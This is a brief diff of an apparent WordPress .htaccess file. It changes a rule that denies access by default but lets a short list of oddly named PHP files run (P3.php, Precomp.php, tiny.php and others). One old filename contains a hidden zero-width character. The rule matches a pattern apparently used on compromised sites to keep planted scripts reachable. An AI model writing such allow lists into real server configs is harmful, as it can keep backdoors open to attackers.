@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(advanced-cache.php|autoptimize_404_handler.php|wp-comments-disable​.php|P3.php|P4.php|Precomp.php)$">
+<FilesMatch "^(project.php|tiny.php|post.php|P3.php|P4.php|Precomp.php)$">
 
 Order allow,deny
 
